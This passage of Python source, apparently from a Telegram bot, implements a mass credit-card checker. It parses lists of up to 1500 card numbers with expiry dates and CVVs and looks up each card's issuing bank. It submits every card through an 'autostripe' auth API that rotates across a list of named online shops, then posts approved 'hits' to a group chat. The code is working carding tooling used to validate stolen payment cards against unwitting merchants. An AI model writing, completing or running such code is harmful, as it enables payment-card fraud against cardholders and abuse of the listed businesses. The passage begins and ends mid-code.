        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "<b>Do you need approved cards?</b>\n\n"
        "<i>Yes: Sends both Charged and Approved cards.</i>\n"
        "<i>No: Sends only Charged cards.</i>",
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def handle_msh_confirm_callback(update: Update, context: CallbackContext):
    """
    Handle the callback when user clicks Yes or No for approved cards.
    """
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    callback_data = query.data

    # Determine preference based on button clicked
    include_approved = False
    if callback_data.startswith("msh_yes_"):
        include_approved = True
    elif callback_data.startswith("msh_no_"):
        include_approved = False
    else:
        return

    # Check if user has pending check
    if user_id not in pending_mass_checks:
        await query.edit_message_text(
            "<b>Error:</b> No pending mass check found. Please restart with /msh.",
            parse_mode="HTML"
        )
        return

    # Retrieve pending data
    pending_data = pending_mass_checks.pop(user_id)
    cards = pending_data["cards"]
    user_info = pending_data["user_info"]
    original_update = pending_data["update"]
    
    # Delete the confirmation message
    try:
        await query.delete_message()
    except Exception:
        pass

    # Start the mass check with the user's preference
    logger.info(f"MSH started for user {user_id} with include_approved={include_approved}")
    asyncio.create_task(msh_process_mass_check(cards, user_info, original_update, context, include_approved))



# ============================================================
# MODULE: mau
# ============================================================
# Configure logging

# Dictionary to store active mass check processes for mau only
active_mass_checks = {}

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Dictionary to track user message sending rate (to prevent spamming)
user_message_rates = {}

# Group ID for hit detection notifications
HIT_DETECTION_GROUP_ID = -1003518846194

# UPDATED: List of sites for API rotation
MAU_SITES = [
    "babyboom.ie",          # Primary
    "dominileather.com",
    "girlslivingwell.com",
    "shop.wattlogic.com",
    "dutchwaregear.com",
    "mjuniqueclosets.com",
    "peeteescollection.com",
    "2poundstreet.com",
    "sockbox.com"
]

def mau_generate_session_id(length=8):
    """Generate a random session ID."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def mau_luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def mau_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: /mass 4296190000711410|08|30|545
        r'^\/[a-zA-Z]+\s+(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: /mass 4296190000711410/08/30/545
        r'^\/[a-zA-Z]+\s+(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: /mass 4296190000711410:08:30:545
        r'^\/[a-zA-Z]+\s+(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern for card details anywhere in text (not at start)
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            # For patterns with command prefix, we need to adjust groups
            if pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                # Skip first group (command) and get card details
                groups = match.groups()
                if len(groups) == 4:
                    card_number, month, year, cvv = groups
                else:
                    continue
            else:
                # For patterns without command prefix, get all groups
                groups = match.groups()
                if len(groups) == 4:
                    card_number, month, year, cvv = groups
                else:
                    continue
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def extract_cards_from_text(text: str) -> List[str]:
    """
    Extract only valid card details from text, ignoring other content.
    
    Args:
        text: String containing multiple card details and other text
        
    Returns:
        List of card strings
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30|545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                
                # Normalize month (ensure it's 2 digits)
                month = month.zfill(2)
                
                # Normalize year (if it's 4 digits, take last 2)
                if len(year) == 4:
                    year = year[2:]
                
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:  # Avoid duplicates
                    cards.append(card_string)
    
    # Limit to 1500 cards
    return cards[:1500]

async def mau_check_card(card_details: str, user_info: Dict, stop_event: asyncio.Event = None) -> Optional[Dict]:
    """
    Check a single card using the Stripe Auth API with site rotation.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        stop_event: Event to check if process should be stopped
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Check if we should stop before making API call
    if stop_event and stop_event.is_set():
        logger.info(f"Process stopped before checking card {card_details[:6]}******")
        return None
    
    # Parse card details
    parsed = mau_parse_card_details(card_details)
    if not parsed:
        logger.error(f"Failed to parse card details: {card_details}")
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm
    if not mau_luhn_check(card_number):
        logger.error(f"Card failed Luhn check: {card_number}")
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)",
            "is_luhn_failed": True
        }
    
    # Get BIN information using imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Format the card details for the API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    
    # --- FIX START: Session Management & Timeout ---
    
    # Timeout settings (90s total)
    timeout = aiohttp.ClientTimeout(total=90, connect=30)
    
    # Connector settings
    # ssl=False: Disables SSL verification (required for HTTP)
    # force_close=False: Allows connection reuse (better performance)
    # limit=100: Pool size
    connector = aiohttp.TCPConnector(ssl=False, force_close=False, limit=100)

    # Headers (Defined once to save resources)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }

    # --- FIX: Create ONE session OUTSIDE the site loop to prevent socket churn ---
    async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
        
        # Loop through MAU_SITES to find a working one
        for site in MAU_SITES:
            # Check if we should stop before processing
            if stop_event and stop_event.is_set():
                logger.info(f"Process stopped before API call for card {card_details[:6]}******")
                return None
            
            # CRITICAL FIX: Using HTTP instead of HTTPS.
            # "Connection closed" often means the client is trying to speak HTTPS to an HTTP server.
            api_url = f"{STRIPE_AUTH_API_URL}/gateway=autostripe/key=Blackxcard/site={site}/cc={formatted_card}"
            
            try:
                # Make the API request
                async with session.get(api_url, skip_auto_headers=['Accept-Encoding']) as response:
                    
                    # Check if we should stop after getting response
                    if stop_event and stop_event.is_set():
                        logger.info(f"Process stopped after API response for card {card_details[:6]}******")
                        return None
                    
                    if response.status != 200:
                        # Try next site on HTTP error
                        logger.warning(f"HTTP {response.status} on site {site} for card {card_details[:6]}******. Retrying next site.")
                        continue
                    
                    # --- CRITICAL FIX START: Read JSON INSIDE the context block ---
                    # The connection is only open inside this 'async with' block.
                    # Reading response.json() outside causes "Connection closed".
                    try:
                        api_response = await response.json()
                    except (json.JSONDecodeError, aiohttp.ContentTypeError) as e:
                        # If response isn't JSON, try next site
                        logger.warning(f"Invalid JSON from site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                        continue
                    # --- CRITICAL FIX END ---

                    # Check if we got a valid response
                    if not api_response:
                        continue
                    
                    # Extract response fields from new API format
                    status = api_response.get("status", "unknown")
                    message = api_response.get("response", api_response.get("message", "No response message"))
                    
                    # If status is missing or empty, try next site
                    if not status:
                        continue

                    # If we are here, we have a valid response
                    logger.info(f"Card processing result for {card_details[:6]}****** via {site}: Status={status}, Message={message}")
                    
                    return {
                        "card_details": card_details,
                        "card_number": card_number,
                        "month": month,
                        "year": year,
                        "cvv": cvv,
                        "api_response": {
                            "status": status,
                            "response": message
                        },
                        "brand": brand,
                        "issuer": issuer,
                        "country": country_name,
                        "country_flag": country_flag
                    }
            
            except asyncio.TimeoutError:
                logger.warning(f"Timeout (90s) on site {site} for card {card_details[:6]}******. Retrying next site.")
                continue # Try next site
            except aiohttp.ClientError as e:
                # Log specific error for debugging
                logger.warning(f"Network error on site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                continue
            except Exception as e:
                logger.warning(f"Exception on site {site} for card {card_details[:6]}******: {e}. Retrying next site.")
                continue

    # If all sites failed
    return {
        "card_details": card_details,
        "error": "API request failed on all backup sites"
    }

def mau_format_response_stripe_auth(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for Stripe Auth.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Check if this is a Luhn check failure
        is_luhn_failed = result.get('is_luhn_failed', False)
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/rev3rsex'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        # Return declined status for Luhn check failures
        if is_luhn_failed:
            return formatted_error, "declined"
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    # New API: status can be "APPROVED", "DECLINED", "ERROR"
    status = api_response.get("status", "")
    
    message = api_response.get("response", api_response.get("message", "No response message"))
    
    # Determine status style based on status content
    status_lower = status.lower()
    if status_lower == "approved":
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
        status_category = "approved"
    elif status_lower == "declined":
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
    else:
        status_style = "<b>𝙀𝙍𝙍𝙊𝙍</b> ⚠️"
        status_category = "error"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response, status_category

def mau_format_hit_detected_message(result: dict, user_info: dict) -> str:
    """
    Format a hit detected message for group chat.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string for hit detection message
    """
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    message = api_response.get("response", api_response.get("message", ""))
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑯𝒊𝒕 𝒅𝒆𝒕𝒆𝒄𝒕𝒆𝒅</b> ↬ <b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅</pre>"""
    
    # Combine all parts
    hit_message = f"""{status_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝚊𝐭𝐞𝐰𝚊𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫 ↬</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐇𝐢𝐭 𝐅𝐫𝐨𝐦</b> ↬ <a href='https://t.me/stripenigga'>𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>"""
    
    return hit_message

def mau_format_progress_response(stats: Dict, session_id: str) -> Tuple[str, InlineKeyboardMarkup]:
    """
    Format progress message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        session_id: Session ID for this mass check process
        
    Returns:
        Tuple of (formatted string, inline keyboard markup)
    """
    # Calculate percentage
    percentage = int((stats["checked"] / stats["total"]) * 100) if stats["total"] > 0 else 0
    
    # Create progress message with exact format requested (gateway added above total cards)
    progress_msg = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙿𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐</b> 📊</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]} ({percentage}%)</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐒𝐭𝐨𝐩 𝐂𝐨𝐦𝐦𝐚𝐧𝐝</b> ↬ <code>/stop {session_id}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    # No inline keyboard needed since we're using /stop command
    reply_markup = None
    
    return progress_msg, reply_markup

def mau_format_stopped_response(stats: Dict, elapsed_time: float, user_name: str, session_id: str) -> str:
    """
    Format stopped message with statistics (without stop button).
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with stopped statistics
    """
    # Create stopped message with exact format requested (gateway added above total cards)
    stopped_msg = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙎𝙩𝙤𝙥𝙥𝙚𝙙</b> ⏹️</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑻𝒊𝒎𝒆</b> ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐂𝐡𝐞𝐜𝐤 𝐁𝐲</b> ↬ <code>{user_name}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return stopped_msg

def mau_format_final_response(stats: Dict, elapsed_time: float, user_name: str, stopped: bool = False, session_id: str = None) -> str:
    """
    Format final results message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of user
        stopped: Whether process was stopped by user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with final statistics
    """
    # Create final message with exact format requested (gateway added above total cards)
    if stopped:
        status_text = "<b>𝙎𝙩𝙤𝙥𝙥𝙚𝙙</b> ⏹️"
        header_text = "𝑺𝒕𝒂𝒕𝒖𝒔"
    else:
        status_text = "<b>𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙</b> ✅"
        header_text = "𝑴𝒐𝒎𝒎𝒂𝒓𝒚"
    
    final_msg = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>{header_text}</b> ↬ {status_text}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃</b> ↬ <code>{session_id if session_id else 'N/A'}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝘀𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b> ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐂𝐚𝐫𝐝𝐬</b> ↬ <code>{stats["error"]}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑻𝒊𝒎𝒆</b> ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐂𝐡𝐞𝐜𝐤 𝐁𝐲</b> ↬ <code>{user_name}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return final_msg

async def safe_send_message(context, chat_id, text, reply_markup=None, parse_mode="HTML", retries=3):
    """
    Safely send a message with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        chat_id: ID of chat to send message to
        text: Message text to send
        reply_markup: Optional reply markup
        parse_mode: Parse mode for message
        retries: Number of retry attempts
        
    Returns:
        Message object or None if all retries failed
    """
    for attempt in range(retries):
        try:
            return await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(2)  # Wait before retrying
                continue
            logger.error(f"Failed to send message after {retries} attempts due to timeout")
            return None
        except Exception as e:
            logger.error(f"Error sending message: {str(e)}")
            return None

async def safe_edit_message_text(context, chat_id, message_id, text, reply_markup=None, parse_mode="HTML", retries=3):
    """
    Safely edit a message with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        chat_id: ID of chat containing message
        message_id: ID of message to edit
        text: New message text
        reply_markup: Optional reply markup
        parse_mode: Parse mode for message
        retries: Number of retry attempts
        
    Returns:
        Message object or None if all retries failed
    """
    for attempt in range(retries):
        try:
            return await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(2)  # Wait before retrying
                continue
            logger.error(f"Failed to edit message after {retries} attempts due to timeout")
            return None
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # This is not an error, just return the message
                return await context.bot.get_message(chat_id=chat_id, message_id=message_id)
            logger.error(f"Error editing message: {str(e)}")
            return None
        except Exception as e:
            logger.error(f"Error editing message: {str(e)}")
            return None

async def safe_answer_callback_query(context, callback_query_id, text=None, show_alert=False, retries=3):
    """
    Safely answer a callback query with retries to handle timeouts.
    
    Args:
        context: Telegram context object
        callback_query_id: ID of callback query to answer
        text: Optional text to show
        show_alert: Whether to show as an alert
        retries: Number of retry attempts
        
    Returns:
        True if successful, False otherwise
    """
    for attempt in range(retries):
        try:
            await context.bot.answer_callback_query(
                callback_query_id=callback_query_id,
                text=text,
                show_alert=show_alert
            )
            return True
        except TimedOut:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            logger.error(f"Failed to answer callback query after {retries} attempts due to timeout")
            return False
        except Exception as e:
            logger.error(f"Error answering callback query: {str(e)}")
            return False

async def mau_update_progress_message(context, update, stats, session_id):
    """
    Update the progress message with current statistics.
    
    Args:
        context: Telegram context object
        update: Telegram update object
        stats: Dictionary containing statistics
        session_id: Session ID for this mass check process
    """
    try:
        # Get the active check data
        if session_id not in active_mass_checks:
            return
            
        active_check = active_mass_checks[session_id]
        chat_id = active_check.get("chat_id")
        message_id = active_check.get("message_id")
        
        if not chat_id or not message_id:
            return
            
        # Format progress message
        progress_msg, _ = mau_format_progress_response(stats, session_id)
        
        # Update the message
        await safe_edit_message_text(
            context,
            chat_id,
            message_id,
            progress_msg
        )
        
        # Update last progress time
        active_check["last_progress_update"] = time.time()
        
    except Exception as e:
        logger.error(f"Error updating progress message: {str(e)}")

async def mau_process_mass_check(cards: List[str], user_info: Dict, update, context):
    """
    Process mass check in background with parallel card processing (Batch of 5).
    
    Args:
        cards: List of cards to check
        user_info: Dictionary containing user information
        update: Telegram update object
        context: Telegram context object
    """
    user_id = user_info.get("id")
    first_name = user_info.get("first_name")
    
    # Generate a unique session ID
    session_id = mau_generate_session_id()
    
    logger.info(f"Starting mau mass check for user {user_id} with session ID {session_id} and {len(cards)} cards")
    
    # Initialize counters
    stats = {
        "total": len(cards),
        "checked": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    }
    
    # Record start time
    start_time = time.time()
    
    # Create a stop event for this process
    stop_event = asyncio.Event()
    
    # Create a stop flag for this user with additional information - SPECIFIC TO MAU
    active_mass_checks[session_id] = {
        "stopped": False,
        "task": None,
        "message_id": None,
        "start_time": start_time,
        "stats": stats,  # Store stats reference
        "last_progress_update": 0,  # Track when progress was last updated
        "stop_event": stop_event,  # Add stop event for immediate cancellation
        "session_id": session_id,  # Add session ID
        "user_id": user_id,  # Add user ID for permission checking
        "chat_id": update.effective_chat.id  # Add chat_id for message editing
    }
    
    # Create initial progress message with requested format
    progress_msg, reply_markup = mau_format_progress_response(stats, session_id)
    
    # Try to send initial progress message with retries
    checking_message = None
    for attempt in range(3):  # Try up to 3 times
        try:
            checking_message = await update.message.reply_text(
                progress_msg,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            if checking_message:
                break
        except TimedOut:
            if attempt < 2:  # Don't wait on last attempt
                await asyncio.sleep(1)
                continue
            logger.error(f"Failed to send initial progress message after {attempt + 1} attempts due to timeout")
        except Exception as e:
            logger.error(f"Error sending initial progress message: {str(e)}")
            if attempt < 2:  # Don't wait on last attempt
                await asyncio.sleep(1)
                continue
    
    # If we couldn't send message after 3 attempts, stop process
    if not checking_message:
        logger.error(f"Failed to send initial progress message after 3 attempts for user {user_id}")
        if session_id in active_mass_checks:
            del active_mass_checks[session_id]
        return
    
    # Store message ID for later editing
    active_mass_checks[session_id]["message_id"] = checking_message.message_id
    
    # UPDATED: Process cards in batches of 5 (Parallel)
    try:
        # Define batch size
        BATCH_SIZE = 5
        
        # Calculate total batches
        total_batches = (len(cards) + BATCH_SIZE - 1) // BATCH_SIZE
        
        for i in range(0, len(cards), BATCH_SIZE):
            # Check if process has been stopped
